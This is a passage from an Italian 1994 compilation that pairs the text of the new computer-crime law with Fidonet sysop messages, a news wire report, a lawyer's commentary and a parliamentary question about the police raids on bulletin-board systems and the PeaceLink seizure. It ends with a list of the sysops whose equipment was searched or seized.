telematico,  dei  dati  o  dei  programmi  in  esso  contenuti  o  ad  esso
pertinenti, ovvero l'interruzione, totale o parziale, o  l'arterazione  del
suo  funzionamento,  e'  punto  con  la reclusione sino a due anni e con la
multa sino a lire venti milioni.


				  Art. 5

1.- Nell'articolo 616 del codice  penale  in quarto comma e' sostituito dal
seguente:

    Agli effetti delle disposizioni di questa sezione, per "corrispondenza"
si  intende  quella  epistolare,  telegrafica,  telefonica,  informatica  o
telematica ovvero effettuata  con  ogni  altra  forma  di  comunicazione  a
distanza.

				  Art. 6

1.- Dopo l'articolo 617-ter del Codice penale sono inseriti i seguenti:

    Art.   617-quater (Intercettazione, impedimento o interruzione illecita
di comunicazioni  informatiche  o  telematiche).- Chiunque fraudolentemente
intercetta comunicazioni relative ad un sistema informatico o telematico  o
intercorrenti  tra  piu'  sistemi,  ovvero le impedisce o le interrompe, e'
punto con la reclusione da sei mesi a quattro anni.
    Salvo che il fatto non costituisca  pii' grave reato, la stessa pena si
applica a chiunque rivela,  mediante  qualsiasi  mezzo  di  infoamzione  al
pubblico,  in  tutto o in parte, il contenuto delle comunicazioni di cui al
primo comma.
    I delitti di cui al primo e secondo comma sono punibili a querela della
persona offesa.
    Tuttavia si procede d'ufficio e  la  pena  e' della reclusione da uno a
cinque anni se il fatto e' commesso:

	1)  in danno a un sistema informatico o telematico utilizzato dallo
	Stato o da  altro  ente  pubblico  o  da  impresa esercente servizi
	pubblici o di pubblica necessita';
	2)  da  un  pubblico  ufficiale  o  da  un  incaricato  di pubblico
	servizio, con abuso dei poteri  o  con  la  violazione  dei  doveri
	inerenti  alla  funzione  o  al  servizio,  ovvero  con abuso della
	qualita' di operatore di sistema;
	3)  da  chi   esercita   anche   abusivamente   la  professione  di
	investigatore privato.

    Art.    617-quinques   (Installazione   di   apparecchiature   atte   a
intercettare,  impedire  od  interrompere  comunicazioni   informatiche   o
telematiche).-  Chiunque,  fuori  dai casi consentiti dalla legge, installa
apparecchiature atte ad intercettare, impedire o interrompere comunicazioni
relative ad un sistema  informatico  o  telematico ovvero intercorrenti tra
piu' sistemi, e' punto con la reclusione da uno a quattro anni.
    La pena e' della reclusione da uno a cinque anni nei casi previsti  dal
quarto comme dell'articolo 617-quater.

    Art.    617-sexies  (Falsificazione,  alterazione  o  soppressione  del
contenuto di comunicazioni informatiche  o telematiche).- Chiunque, al fine
di procurare a se o ad altri un vantaggio o di arrecare ad altri un  danno,
forma  falsamente  ovvero  altera  o  sopprime,  in  tutto  o  in parte, il
contenuto,   anche   occasionalmente    intercettato,   di   taluna   delle
comunicazioni  relative  ad  un  sistema   informatico   o   telematico   o
intercorrenti  tra  piu'  sistemi, e' punito, qualora ne faccia uso o lasci
che altri ne facciano uso, con la reclusione da uno a quattro anni.
    La pena e' della reclusione da uno  a cinque anni nei casi previsti dal
quarto comme dell'articolo 617-quater.

				  Art. 7

1.- Nell'articolo 621 del codice penale, dopo il primo comma e' inserito il
seguente:

    Agli effetti della disposizione di cui al primo  comma  e'  considerato
documento   anche   qualunque   supporto   informatico   contenente   dati,
informazioni o programmi.

				  Art. 8

1.- L'articolo 623-bis del codice penale e' sostituito dal seguente:

    Art.   623-bis  (Altre comunicazioni o conversazioni).- Le disposizioni
contenute  nella   presente   sezione,   relative   alle   comunicazioni  e
conversazioni telegrafiche, telefoniche,  informatiche  o  telematiche,  si
applicano  a  qualunque  altra trasmissione a distanza di suoni, immagini o
altri dati.

				  Art. 9

1.- Dopo l'art. 635 del codice penale e' inserito il seguente:

    Art.  635-bis (Danneggiamento  di  sistemi  informatici e telematici).-
Chiunque distrugge, deteriora o rende, in tutto  o  in  parte,  inservibili
sistemi  informatici  o telematici altrui, ovvero programmi, informazioni o
dati altrui, e' punito, salvo  che  il  fatto costituisca piu' grave reato,
con la reclusione da sei mesi a tre anni.
    Se ricorre una o piu' circostanze di cui  als  econdo  comma  dell'art.
635,  ovvero  se il fatto e' commesso con abuso della qualita' di operatore
di sistema, la pena e' della reclusione da uno a quattro anni.

				  Art. 10

1.- Dopo l'art. 640-bis del cosice penale e' inserito il seguente:

    Art.  640-ter (Frode  informatica).-  Chiunque,  alterando in qualsiasi
modo il funzionamento di un sistema informatico o telematico o intervenendo
senza diritto con qualsiasi modalita' su  dati,  informazioni  o  programmi
contenuti  in  un  sistema  informatico  o telematico o ad esso pertinenti,
procura a se o ad altri  un  ingiusto  profitto con altrui danno, e' punito
con la reclusione da sei mesi a tre anni e con la multa da lire centomila a
due milioni.
    La pena e' della reclusione da uno a cinque anni e della multa da  lire
seicentomila  a  tre  milioni se ricorre una delle circostanze previste dal
numero 1) del secondo comma  dell'art.640,  ovvero  se il fatto e' commesso
con abuso della qualita' di operatore di sistema.
    Il delitto e' punibile  a  querela  della  persona  offesa,  salvo  che
ricorra  taluna  delle  circostanze  di  cui  al  secondo  comma o un'altra
circostanza aggravante.

				  Art. 11

1.- Dopo l'articolo 266 del CPP e' inserito il seguente:

    Art.   266-bis   (intercettazioni   di   comunicazioni  informatiche  o
telematiche).- Nei procedimenti relativi ai  reati  indicati  nell'articolo
266,   nonche'   a   quelli   commessi  mediante  l'impiego  di  tecnologie
informatiche o telematiche, e'  consentita  l'intercettazione del flusso di
comunicazioni  relativo  a  sistemi   informatici   o   telematici   ovvero
intercorrente tra piu' sistemi.

---------------------------------------------------------------------------

     And now alcuni messaggi presi qua' e la' ... 

-------------------------MESSAGGI------------------------------------------


 * Forwarded from "SYSOP.033 ->Conf. Sysop Italia"
 * Originally by Vertigo, 2:331/301
 * Originally to Tutti
 * Originally dated 12 May 1994, 0:49

Salve a tutti.

Quanto sto per riferirvi e' alquanto frammentario e confuso 
perche' deriva da informazioni raccolte da piu' fonti al 
telefono e quindi non ho tutti i dettagli: il succo 
comunque e' che nella giornata di mercoledi' 11 maggio la 
guardia di finanza ha compiuto una serie di raid presso 
molte BBS Fidonet, sequestrando computer ed apparecchiature!

Pare che la cosa sia avvenuta nell'ambito di un'inchiesta 
sulla pirateria avviata dalla procura di Pesaro e avente 
come indiziati due tizi di nome Paolo Paolorosso e Riccardo 
Cardinali (non sono certo al 100% dei nomi, ma cosi' mi 
hanno riferito). La guardia di Finanza e' andata a casa di 
parecchi sysop Fidonet (e, pare, anche non Fidonet) per 
accertamenti, perquisendo le abitazioni, esaminando 
computer e dischetti e sequestrando materiale (computer, 
stampanti, modem, dischetti) o sigillandolo.

Conosco i nominativi di sysop solo del 331 visitati dalla 
finanza, tra i quali Alfredo Persivale, Domenico Pavone, 
Valentino Spataro, Luca Croci, Luca Spada e Walter 
Mascarin, ma credo che la cosa sia estesa anche altrove in 
Italia.
Ho parlato telefonicamente con Domenico, il quale riferisce 
che hanno addirittura messo i sigilli alla stanza 
contenente computer e dischetti, nella quale ora non puo' 
piu' entrare.

Non si ha idea del motivo per cui queste persone (sulle cui 
BBS non era presente materiale piratato) siano state 
coinvolte nell'inchiesta. Se qualcuno ha informazioni piu' 
precise in merito, si faccia avanti.

Oggi mi incontrero' con un po' di persone coinvolte nella 
cosa e cercheremo di fare il punto della situazione. Credo 
sia superfluo invitare tutti alla massima cautela e 
collaborazione.

Ciao,
--V--

 * Forwarded from "SYSOP.033 ->Conf. Sysop Italia"
 * Originally by Enrico Franceschetti, 2:335/212.1
 * Originally to Tutti
 * Originally dated 13 May 1994, 16:27

Ciao a tutti.

Assisto con sgomento e meraviglia a quanto e' accaduto l'11 maggio scorso a
molti amici e "colleghi" sysops di tante parti d'Italia.
Un provvedimento di un giudice pesarese, motivato dalla 
necessita' di sgominare
un traffico di software duplicato, ha dato la stura ad una serie di azioni
istruttorie e misure cautelari davvero notevole.
Tutti abbiamo sentito parlare di attrezzature elettroniche (a volte anche
banali, come segreterie telefoniche o apparecchi autocostruiti) poste sotto
sequestro, di perquisizioni minutissime in appartamenti ed aziende, di sigilli
poste ad ambienti di casa. Insomma, un vero e proprio blitz organizzato
pensando di affrontare una organizzazione oliata e ben esperta nel crimine.

Ma cio' e' plausibile?

Quale professionista ed "operatore del diritto" rimango colpito dal modo con
cui questa serie di azioni sono state eseguite. Vengono di fatto inferti a
privati cittadini, senza l'esistenza di sostanziali elementi di prova a loro
carico, danni notevolissimi di carattere economico e morale.
Il blocco di un computer, la sua asportazione, l'impossibilita' di svolgere le
consuete attivita' lavorative ad esso legate, comportano un ingiusto danno da
sopportare, assolutamente sproporzionato sia agli elementi in possesso degli
inquirenti e sia al tipo di reato contestato (non si riesce ad immaginare
la portata delle azioni che, basandosi sul metro di quanto abbiamo visto, do-
vrebbero venire attuate quando di mezzo vi sono organizzazioni criminali ben
piu' pericolose ed attive).
Per non parlare poi delle spese legali che dovranno essere 
affrontate da chi ha
ricevuto avvisi di garanzia, il 100% dei quali, ne sono certo, si sgonfieranno
come neve al sole; non prima pero' di aver tenuto in ambasce famiglie intere e
costretto le medesime a notevoli esborsi economici.
In sostanza, e denegando ogni principio giuridico 
esistente, occorre dimostrare
di essere innocenti... e sopportare in silenzio le conseguenze della propria
"presunta colpevolezza".

Ma non basta.

So che da tempo un'altra struttura pubblica di investigazione stava preparando
con accuratezza una indagine sulle Bbs pirata; da mesi, con infiltrazioni,
contatti, appostamenti, si stava raccogliendo il materiale necessario per
inchiodare i veri responsabili di questo traffico illecito alle proprie
responsabilita'.
Ora, l'intervento clamoroso di questo magistrato, lungi dall'aver colpito veri
"pirati" ha ottenuto l'unico effetto di terrorizzare decine di onest'uomini e
far scappare (distruggendo ogni materiale illegale) i professionisti della
copia i quali, messi in allarme da questo inutile polverone, saranno ora molto
piu' attenti e cauti nelle loro attivita'.

A chi giova tutto cio'?

La risposta e' di difficile individuazione. Certo, non puo' sfuggire la
grossolanita' dell'intervento operato e la sua durezza, nonche' la scarsissima
preparazione tecnica denotata dalle varie "squadre" di finanzieri che si sono
mosse in tutto il paese, preferendo troppo spesso sequestrare e sigillare
piuttosto che cercare di comprendere cosa si trovavano davanti.
Ugualmente non puo' non notarsi come la telematica amatoriale in Italia sia
davvero strumento "potente" per la diffusione e la circolazione delle idee.
Forse come in nessuna altra parte del mondo in Italia le "reti" amatoriali
conservano uno spirito appunto "amatoriale" che le rende 
disponibili facilmente
ad una grande platea di utenti, strangolati invece dalle elevate tariffe dei
servizi pubblici (Videotel in testa).

Allo stato non sappiamo ancora quali sviluppi attenderci: speriamo solo di non
essere costretti ad ammettere che il paese che una volta era la culla del
diritto e' divenuto oggi soltanto un paese di indagati ed inquisitori.

Ciao,
	   Enrico


 * Forwarded from "SYSOP.033 ->Conf. Sysop Italia"
 * Originally by Vertigo, 2:331/301
 * Originally to Tutti
 * Originally dated 13 May 1994, 11:39

Copia in SYSOP.033 e crash agli NC/NEC.

Alcune notizie sparse sulla faccenda dei sequestri, scusate la telegraficita'
1) Ieri sera qui a Milano ci siamo incontrati in parecchi tra sysop coinvolti 
e non, per discutere della faccenda. Con la sola eccezione 
di Walter Mascarin e Michele Fadda, a quanto mi risulta, a 
tutti e' stato sequestrato il materiale informatico, 
portandolo via o sigillando i locali in cui era contenuto.

2) Occorre immediatamente organizzarsi per cercare legali 
in loco (Pesaro). Qualcuno si e' gia' mosso personalmente 
(Luca Spada ha preso un avvocato pesarese), Franco Mulato 
sta cercando di organizzarsi in questo senso.
Avvertite tutti coloro che hanno ricevuto avviso di 
garanzia di mettersi in contatto con Franco Mulato, 
inviandogli copia del documento via fax al numero 0574-
38816 ed allegando un recapito telefonico a VOCE.

3) Domenica pomeriggio a Bologna ci sara' un incontro 
straordinario per discutere della faccenda. Sede e dettagli 
ancora da definire, teniamoci in contatto telefonicamente, 
il mio numero d'ufficio e' 02-76001713.

4) Io e la Folletta, su proposta di Pasquini, ci stiamo 
organizzando per stendere il testo di un'interpellanza 
parlamentare sull'accaduto che dovrebbe essere inoltrata 
dal radicale Roberto Cicciomessere nei prossimi giorni. Chi 
avesse materiale da sottoporre o proposte me le faxi in 
ufficio (fax 02-780472).

5) Occorre cercare di organizzare una specie di sottoscrizione per 
raccogliere qualche soldo per le spese (avvocati etc.) a 
favore di chi e' gia' stato coinvolto e di chi lo sara' 
prossimamente. L'impressione comune e' che la cosa 
procedera' anche nei prossimi giorni con nuovi raid e 
sequestri.

6) Su "La Repubblica" di oggi e' apparso un articolo a pag. 
21 a firma di Claudio Gerino che descrive l'accaduto. Non 
ho visto finora riferimenti su altri quotidiani.

Ciao,
--V--
(RC)

 * Forwarded from "SYSOP.033 ->Conf. Sysop Italia"
 * Originally by Sandro Gasparetto, 2:334/201
 * Originally to All
 * Originally dated 14 May 1994, 20:19

* Crossposted in SYSOP.033
* Crossposted in NETSYSOP.334

Per fortuna non sono venuti da me (ancora).
Nel dubbio ho interpellato il mio avvocato, e gli ho chiesto come comportarmi.
Il mio avvocato e' pure un amico da decenni (andavamo a scuola insieme), per 
cui mi fido di quello che mi ha detto, e con me non si 
esprime in termini oscuri, ma mi ha sempre aiutato.

- Arrivano con un mandato, per cui non e' possibile fermarli o opporsi.
- Hanno un ordine esecutivo, possono fare quasi di tutto, ma.....
- se il PC e' legato ad una attivita' (hardware o software) 
non hanno assolutamente il potere di fermare questa 
attivita' commerciale (se non temporaneamente), per cui con 
un buon avvocato si puo' fare in modo che prelevino quanto 
serve per la loro inchiesta, senza pregiudicare il 
proseguimento della attivita'.  Si puo' parlare di copie o 
simili cose....
- l'eventuale sequestro dovrebbe essere di breve durata. 
Lui conta di fare ottenere velocemente il dissequestro al 
mio amico Gianni.
- Secondo lui ( e' in contatto con un altro avvocato di 
Pesaro) l'inchiesta e' stata "a campione", partendo da 
indirizzi trovati a caso. Nel mucchio hanno preso anche 
gente che non c'entra niente. Ma ora dovrebbe essere tutto 
finito.
 ( no altre visite...)
- Lui pensa che l'andazzo di usare metodi "terroristici e 
vessatori" dovrebbe smettere, e lui conta che tra non molto 
cambi.

La gente che lavora dovrebbe non essere piu' criminalizzata di una finanza che
tiene in ostaggio una intera classe sociale.

Quest'ultima e' una mia considerazione, prendetela come uno sfogo.

bye,    Sandro


* Area : SYSOP.033 ->Conf. Sysop Italia
* From : Vertigo, 2:331/301 (Mercoledi Maggio 18 1994 19:57)
* To   : Tutti
* Subj : ANSA: altri 14 !

Appena arrivato! :-(

Torino, 18 Mag 19:20

INFORMATICA: DENUNCIATI IN TUTTA ITALIA 14 "PIRATI"

Quattordici "pirati informatici" italiani che, avvalendosi di collegamenti
telematici con esperti americani, sottraevano aoftware ai produttori e poi li
commercializzavano in Italia a prezzi irrisori, sono stati denunciati a piede
libero dal nucleo regionale di polizia tributaria della Guardia di Finanza.
Nell'operazione e' stato sequestrato materiale complessivo per un valore di
circa quattro miliardi di lire: 17 personal computer, 13690 floppy disk
contenenti software illecitamente duplicato, otto dischi CdRom, 27 modem per
collegamenti tramite linee telefoniche, quattro apparecchiature per l'utilizzo
di linee telefoniche, manuali di istruzione per programmi e componenti per
elaboratori elettronici.
La Guardia di Finanza, che sta ancora completando le indagini, non ha reso noto
i nominativi degli indagati, ma soltanto le citta' dove sono stati fatti i
sequestri: Torino, Poirino (Torino), Sesto san Giovanni (Milano), Savona,
Genova, Pesaro, Terni, Napoli, Pesaro e Pescara. "La tecnologia utilizzata dai
pirati - e' detto in una nota della Guardia di Finanza - ha stupito gli stessi
militari del nucleo regionale di polizia tributaria, che si sono trovati di
fronte a soggetti utilizzatori di comunicazioni via satellite, di 'call card'
contraffatte per usufruire delle reti telefoniche private nordamericane e dei
piu' avanzati personal computer". (ANSA)


  Msg#: 2979            Rec'd Local                  Date: 26 May 94  00:34
  From: Il Conte                                     Read: Yes    Replied: No 
  Subj: risposte

PRIMA DOMANDA:  Se ti vedi spuntare la GdF a casa,  accendi  subito un
lumino al tuo Santo preferito, perche' sono guai.
     I  cattivi,  muniti  di  mandato  di  perquisizione  e sequestro,
arrivano e ti chiedono:
     a)  di vedere i tuoi dischetti;  se ne trovano  di non originali,
contenenti  files .EXE  e simili,  li mettono in  uno  scatolino  e li
sequestrano;
     b)  di stampare la directory del tuo hard disk  (per esempio, con
un DIR /s(ubdirectories)   /h(idden);  dal nome delle subdirectories o
dei programmi,  li identificano e ti chiedono le licenze originali; se
hai tutti programmi regolarmente  acquistati bene,  se no procedono al
sequestro del computer (quale cosa che servi' a commettere il presunto
reato).
     c)  non sono in grado di precisare se la GdF  conosce l'esistenza
dei programmi Public Domain o Shareware:  volendo, potrebbero ritenere
abusivi anche tali programmi.
				*  *  *
     Il sequestro si effettua mediante:
     -  sigillatura dello scatolo contenente i  dischetti, che vengono
descritti nel verbale;
     -  sigillatura del computer, su cui viene apposta una striscia di
carta con i timbri della P.G. che ne impediscono l'uso.
     La GdF  (o gli altri  organi di Polizia Giudiziaria)  redigono un
verbale di sequestro,  dove e' allegata la DIR dell'HDD, e trasmettono
tutto all'Autorita' Giudiziaria.
				*  *  *
     Contro  il sequestro e'  consentito il ricorso  al c.d. Tribunale
della Liberta'  (o  del  riesame);  ne  ho  fatto  uno,  e  me l'hanno
rigettato con una motivazione del tipo:  vediamo il processo, e poi ti
diremo se il sequestro e' legittimo.
				*  *  *
     L'Autorita'  Giudiziaria, poverina, non sa nulla di informatica e
si rivolge ad  un  perito  perche'  esamini il materiale sequestrato e
dica la sua.
     All'esito,  dopo qualche anno,  potrebbe rinviarti a giudizio, ed
allora comincerebbe a discutersi:
     - di quali fatti ti hanno incolpato;
     - di quali prove ritengono di avere.
     L'unico soggetto oggettivamente avvantaggiato  di tale situazione
e'  il perito,  il quale  si  trova  ad  avere  numerosi  e remunerati
incarichi a spese dello Stato.
				*  *  *
     E se,  dopo un paio di anni  (almeno),  ti assolvono per non aver
commesso il fatto, o perche' il fatto non sussiste ?
     Niente:  ti dicono  (forse)  "scusi tanto",  e tutto finisce li',
visto che  il  risarcimento  e'  previsto  solo  per  chi  patisce una
ingiusta detenzione e non per chi sta qualche anno senza  computer e/o
senza programmi lecitamente acquistati.
     Altro che da ridere: ci sara' da piangere.
     E se ti condannano ?
     E  se  la  BSA  o  l'Assoft  si  costituiscono  parte  civile nel
processo, per chiedere il risarcimento dei danni ?
				*  *  *
SECONDA PARTE DELLA DOMANDA
     Il vecchissimo PCTOOLS dell'88,  ai  fini che  ci interessano, e'
perfettamente  equivalente all'ultimo  costosissimo  game  piu' o meno
virtuale:  il passare degli anni, come sappiamo, rende del tutto fuori
commercio  un  programma,  ma  non ne  autorizza affatto  la copiatura
abusiva.
     Per  quanto  riguarda  la  sussistenza  o  meno  del  reato, vedi
appresso.
				*  *  *
TERZA ED ULTIMA PARTE
     Nello spirito   attuale di caccia alle streghe,  stanno chiudendo
le BBS (Costituzione,  aiutaci tu  se  prima  non  ti  stracciano sti'
leghisti  del ca**o):  sarebbe  antipatico se,  ad esempio, il sistema
contenesse la  indicazione  (che  non  costituisce  una  prova,  ma un
indizio)  che l'utente ICS ha prelevato (in data ---  alle ore ---) un
file contenente un programma abusivamente duplicato.
				*  *  *
INSOMMA: QUAL'E' IL CONTENUTO DI 'STA BENEDETTA LEGGE ?
     Boh !
     Nel senso che siamo a livelli (anche di stupidita'  ed ignoranza)
seriamente preoccupanti.
     Basta vedere l'annunzio pubblicato dalla BSA qualche  mese  fa su
MCMicrocomputer:  una sorta di scheda  per fare la spia,  e denunciare
(magari rimanendo anonimi)  il conoscente,  o la persona semplicemente
antipatica, che detiene software illegalmente duplicato.
     Avete mai visto,  su  qualche rivista o giornale,  una  scheda di
questo tipo per denunciare (che so io)  i casi di violenza sui minori,
o di spaccio di droga davanti alle scuole ?
     Questo dovrebbe significare, agli occhi di un ingenuo osservatore
alieno, che scopiazzare il software e' assai piu' grave (o socialmente
riprovevole)  che spegnere  le  sigarette sulla pancia  dei  figli che
strillano  troppo e vendere  il crack ai quattordicenni  stanchi della
vita.
				*  *  *
     In  ordine  al   contenuto  della  legge   sul  diritto  d'autore
(novellata dal D.  Leg.vo 29-12-1992  n. 518), nessuno dei tecnici del
diritto  -  me compreso  -  ha le  idee chiare,  data la novita' della
riforma ed il suo contenuto schifosamente atecnico  (sia  dal punto di
vista giuridico che da quello informatico).
     Essendo  poco  chiaro per  un giurista,  il testo novellato della
legge e'  davvero incomprensibile ai comuni  mortali: cio' nonostante,
mettero'  a disposizione dell'area quanto e'  a mia conoscenza (non ho
un testo completo).
				*  *  *
     Anteriormente alla novella di cui al citato D.L.vo n.  518/92, le
norme incriminatrici connesse  alla tutela del diritto  d'autore erano
contenute esclusivamente  nel titolo  III,  capo III, sezione II della
Legge  22  aprile 1941  n.  633, intitolata "Difese e sanzioni penali"
(artt. 171 e 172).
     L'unica norma  punitiva applicabile ai programmi  per elaboratore
era,  sino alla novella,  l'art.  171 lett. a), che punisce chiunque :
"riproduce,  trascrive, recita in pubblico, diffonde, vende o mette in
vendita o pone altrimenti in commercio un'opera altrui o ne  rivela il
contenuto  prima  che  sia  reso  pubblico,  o  introduce  e  mette in
circolazione nello Stato esemplari prodotti  all'estero contrariamente
alla legge italiana (...)".
     A seguito della citata  novella,  e'  stato introdotto l'art. 171
bis, il quale cosi' dispone:
     "Chiunque  abusivamente  duplica a fini  di  lucro  programmi per
elaboratore o,  ai medesimi fini e sapendo o avendo  motivo  di sapere
che si tratta di copie non autorizzate,  importa, distribuisce, vende,
detiene  a  scopo  commerciale,  o  concede  in  locazione  i medesimi
programmi,  e'  soggetto alla pena della reclusione da tre mesi  a tre
anni e della multa da L.500.000  a  L.6.000.000.  Si applica la stessa
pena  se  il  fatto  concerne  qualsiasi  mezzo  inteso  unicamente  a
consentire   o   facilitare  la  rimozione   arbitraria  o  l'elusione
funzionale dei dispositivi applicati a protezione di un  programma per
elaboratore.  La pena  non e'  inferiore  nel  minimo  a  sei  mesi di
reclusione  e la  multa a L.1.000.000  se  il  fatto  e'  di rilevante
gravita'  ovvero se  il  programma oggetto  dell'abusiva duplicazione,
importazione, distribuzione, vendita, detenzione a scopo commerciale o
locazione sia stato precedentemente distribuito, venduto o concesso in
locazione su  supporti contrassegnati  dalla  Societa'  italiana degli
autori  ed  editori ai  sensi  della  presente  legge  e  del relativo
regolamento di esecuzione approvato  con regio decreto 18  maggio 1942
n. 1369.
     La  condanna  per  i  reati  previsti  al  comma  1'  comporta la
pubblicazione della sentenza in uno o piu'  quotidiani e in uno o piu'
periodici specializzati."
				*  *  *
     Primo dubbio: vale il principio secondo cui una norma dettagliata
(il nuovo art.  171  bis)  annulla  la  precedente  norma generica (il
vecchio  art.  171),  oppure le norme coesistono entrambe, riguardando
fattispecie diverse ?
     Credo,  sinceramente,  che l'art. 171 non sia piu' applicabile al
software, regolato da una nuova e specifica norma, se non mi ingannano
le dure pagine dei manuali di diritto  penale digerite all'universita'
(e, purtroppo, anche ora).

     Si dovrebbero,  quindi,  distinguere  due  tipi  di comportamenti
penalmente sanzionati dal citato art. 171 bis:
     a)  la  abusiva duplicazione,  a fini di lucro,  di programmi per
elaboratore ("Chiunque abusivamente duplica a fini  di lucro programmi
per elaboratore");
     b)  la  importazione,  distribuzione, vendita, detenzione a scopo
commerciale, o la locazione di programmi per elaboratore, fatta a fini
di lucro,  da parte di chi sa od ha motivo di sapere che si  tratta di
copie non autorizzate ("ai medesimi fini e sapendo o avendo  motivo di
sapere che si tratta di copie non autorizzate,  importa, distribuisce,
vende,  detiene a scopo commerciale, o concede in locazione i medesimi
programmi").
     Ai  posteri  l'ardua  sentenza:  aspettiamo  di  vedere  le prime
decisioni,  ed  i primi ricorsi per cassazione,  e  allora  si' che ci
sara' da ridere.


489 27-Giu-94 14:00 3626 G.Borrello I Roma
---------------------------------------------------------------------
INTERROGAZIONE PARLAMENTARE
(a risposta scritta)

Atti Parlamentari Camera dei Deputati, Seduta del 24 giugno 1994

NARDINI Maria Celeste, VOCCOLI Francesco (Rifondazione)

Ai Ministri delle finanze, delle poste e telecomunicazioni e dell'interno.

Per sapere -

- premesso che:

in data 3 giugno 1994 e stata sequestrata la banca dati centrale della rete
Peacelink in seguito ad una perquisizione ordinata da un magistrato di Taranto;

la banca dati centrale della rete telematica Peacelink:
  era pubblicizzata su tutte le riviste pacifiste;
  aveva diffuso in tempo reale, lo scorso anno, le informazioni sulla
conferenza ONU di Vienna sui diritti umani;
  era il supporto telematico per la realizzazione del giornale "I Siciliani",
fondato da Giuseppe Fava, giornalista assassinato dalla mafia;
  era stata segnalata da RAI Televideo nell'ambito della rubrica "L'Italia
antipiovra" e "Spazio civile" per l'impegno antimafia;
  era stata segnalata da RAI Televideo nell'ambito della rubrica "Spazio
civile" per i suoi collegamenti telematici con la ex Jugoslavia e per i
soccorsi umanitari che si avvalevano di una banca dati specializzata
dell'Italian consorzium of solidarity e di una struttura di volontariato
dell'aria (elisoccorso Montecalvoli), ragion per cui l'Alto commissariato per i
rifugiati ONU ne aveva chiesto la collaborazione per i soccorsi di emergenza;
  era utilizzata da insegnanti per attivita di educazione alla pace e alla
legalita;
  sul settimanale "Avvenimenti" in data 15 giugno 1994 appare che tale
attivita, in particolare quella relativa al pacifismo e al contatto con le
scuole era assoggettata a forme di controllo e -pare- di interferenza da parte
di uomini dei servizi poco prima che avvenisse l'attentato al giudice Falcone;

  il bliz della banca dati centrale di proprieta di Giovanni Pugliese, sita in
Statte (TA), e basato su una indagine promossa da un capitano della Guardia di
finanza di Taranto che ha ritenuto sicure e affidabili voci viceversa
fantasiose e infondate di uso di tale banca dati per diffondere a scopo di
lucro programmi per computer copiati;
  tale raccolta di informazioni non e stata verificata mediante collegamenti
via modem dalla Guardia di finanza di Taranto-

se siano a conoscenza dei fatti citati;
se la Guardia di finanza di Taranto sia dotata di modem e se sia in grado di
usarlo per compiere accertamenti sulle banche dati telematiche;
per quali motivi non sia stata fatta alcuna verifica via modem delle fantasiose
voci giunte alla Guardia di finanza;
se i Ministri in indirizzo non ravvisino in un simile episodio la spia per una
scarsa professionalita e non ritengano di avviare un'indagine sui livelli di
preparazione specifica di tali apparati, in relazione alla prevenzione e alla
repressione della criminalita informatica e telematica, prima che si
verifichino altre perquisizioni e sequestri che -fallendo clamorosamente
l'obiettivo- finiscano per colpire strutture di volontariato informativo che
andrebbero al contrario promosse e sostenute;
se attualmente i servizi di informazione stiano svolgendo un ruolo di
acquisizione di notizie sulle reti telematiche, a che scopo e se in tale
indagine sia stata coinvolta -e per quale motivo- anche Peacelink, nota per i
meriti acquisiti nelle attivita sopra elencate;
quali azioni intendano intraprendere allo scopo  di evitare che simili
situazioni non abbiano piu a ripetersi;
come intendano garantire alla banca dati della rete telematica Peacelink la
ripresa di una attivita essenziale, nonche riconosciuta da piu parti, alla
crescita di una coscienza pacifista e alla difesa dei diritti umani.
 

 * Forwarded from "SYSOP.033 ->Conf. Sysop Italia"
 * Originally by Felice Murolo, 2:335/206@fidonet.org
 * Originally to all
 * Originally dated 16 May 1994, 12:51

** AGGIORNAMENTO **

Segue lista BBS visitati da GDF desunta da messaggi e telefonate. Scusate
le omissioni e imprefezioni.

Notizie:
- Gli avvisi di garanzia emessi sono stati 173.
- L'avvocato Francesco Guida di Taranto, che collabora con PeaceLink, ha
  costituito un gruppo di studio del problema. FAX/segreteria 099 365812,
  richiede l'invio di tutte le infos possibili.

Fido:
------
Luca Spada           2:331/106-117-121 sequestrato tutto
Alberto Giovaninetti 2:331/103 sequestrato tutto
Luca Croci           2:331/108 ?
Ascanio Orlandini    2:331/203 solo perquisito
Paolo Borghesi       2:331/204 sequestrato tutto
Alfredo Persivale    2:331/302 sequestrato tutto, anche comp. azienda
Michele Fadda        2:331/320 solo perquisito
Walter Mascarin      2:331/323 solo perquisito
Domenico Pavone      2:331/331 sequestrata la stanza del computer!
Othmar Tschrepp      2:331/334 sequestrato o sigillato
Giulio Cipriani      2:331/344 sequestrato tutto
Valentino Spataro    2:331/347 sequestrato tutto
Franco Mulato        2:332/101 ?
Samuele Landi        2:332/115 sequestrato tutto
Max Morando          2:332/200 sequestrato tutto
Massimo Berni        2:332/300-301 sequestrato tutto
Roberto Nucci        2:332/303 ?
Alberto Tommasoli    2:332/306 ?
Riccardo Pizzi       2:332/307 sequestrato tutto
Alessandro Trebbi    2:332/313 ?
Lorenzo Lugli        2:332/315 sequestrato tutto a casa sua (la bbs no)
Fabrizio Carloni     2:332/316 sequestrato tutto
Massimo Sabbatini    2:332/320 sequestrato tutto, compreso negozio
Alessandro Benvenuti 2:332/400 sequestrato tutto
Paolo Sinigaglia     2:332/2-407-417-427 sequestrato tutto
Marcello Ardini      2:332/418 sequestrato tutto
Mario Mure'          2:332/505 sequestrato tutto
Marco Venturini Auti 2:332/617 sequestrato tutto
Riccardo Iacobucci   2:332/618 sequestrato tutto
Mario Zambon         2:333/203 sequestrato solo dischetti
Piergiorgio Ghezzo   2:333/707-708 ?
Gianni Bragante      2:334/307 sequestrato Hard Disk
Paolo Goria          2:334/701 risparmiato, sequestrato computers sponsor
Andrea Contini       2:335/428 sequestrato tutto
Alberto Marcedone    2:335/503 convocato dai CC
Marco Tomassoni      2:335/514 convocato dai CC
Michele Scopelliti   2:335/512 sequestrato tutto
Giuseppe Giardina    2:335/713 sequestrato tutto



Non fido:
----------
Vittorio Mori        ex fido, non piu' bbs, sequestrato tutto
Curradini            "Breakdown", sequestrato tutto
Giuseppe Paterno'    "Il Tempio BBS", sequestrato tutto
Super pirata, Terni  non identificato, sequestrato tutto
Riccardo Cassotti    perquisito, BBS chiusa 8 mesi fa.


Points:
--------
Borghesi             2:331/204.3 sequestrato tutto
Caruso               2:331/204.6 sequestrato tutto
Bisanti              ??          sequestrato tutto


Ciao
Felix

574  7-Lug-94 00:54 2949 V.Russo I Roma
-----------------------------------------------------------------------------
PeaceLink - studio legale avv.Guida

Vi giro un mes ricevuto da Alessandro Marescotti in area AVVENIMENTI. Valerio

Ciao Valerio!

Ieri notte mi chiedevi - per conto di Parrella - informazioni piu'
